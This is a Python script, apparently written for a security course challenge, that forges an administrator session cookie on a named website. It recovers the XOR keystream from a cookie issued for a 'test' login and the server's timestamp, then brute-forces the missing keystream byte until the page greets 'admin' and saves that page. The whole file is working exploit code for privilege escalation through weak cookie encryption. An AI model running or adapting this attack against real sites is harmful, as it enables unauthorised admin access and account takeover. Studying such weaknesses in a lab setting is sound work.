#!/usr/bin/env python3
"""Forge admin cookie; on 'Welcome admin', save full body+headers to files."""
import base64, re, time, requests
from email.utils import parsedate_to_datetime

URL = "https://pillar.is-course.ru"
D = 0x3a
def dec(v): return base64.b64decode(v + "=" * (-len(v) % 4))
def enc(b): return base64.b64encode(b).decode()
def mint():
    for _ in range(5):
        try:
            s = requests.Session()
            r = s.post(URL + "/login", data={"login": "test", "password": "test"},
                       headers={"Content-Type": "application/x-www-form-urlencoded"},
                       allow_redirects=True, timeout=15)
            cv = s.cookies.get("session")
            if cv:
                return cv, int(parsedate_to_datetime(r.headers["Date"]).timestamp())
            time.sleep(3)
        except Exception:
            time.sleep(3)
    raise RuntimeError("mint failed")
def ks_of(ct, T, D):
    ks = bytearray(15)
    for i in range(4): ks[i] = ct[i] ^ b"test"[i]
    ks[4] = ct[4] ^ D
    ts = str(T).encode()
    for i in range(5, 15): ks[i] = ct[i] ^ ts[i-5]
    return bytes(ks)
def fetch(cv):
    for _ in range(5):
        try:
            return requests.get(URL + "/", cookies={"session": cv}, timeout=15)
        except Exception:
            time.sleep(1.5)
    return None

ks = None
forged_plaintext = None
for trial in range(800):
    if trial % 3 == 0:
        cv, T = mint()
        ct = dec(cv)
        ks = ks_of(ct, T, D)
        forged_plaintext = b"admin" + bytes([D]) + str(T).encode()
    ks16 = ks + bytes([trial % 256])
    C = bytes(p ^ k for p, k in zip(forged_plaintext, ks16))
    r = fetch(enc(C))
    if r is None: continue
    body = r.text
    u = re.search(r'welcome-header">\s*Welcome, ([^<!]*?)\s*!', body)
    if u and u.group(1) == "admin":
        cookie_val = enc(C)
        print(f"HIT trial {trial}")
        open("pillar_admin_body.html", "w").write(body)
        raise SystemExit(0)
    if trial % 80 == 79:
        print(f"  ...trial {trial}")
    time.sleep(0.2)
print("no admin hit")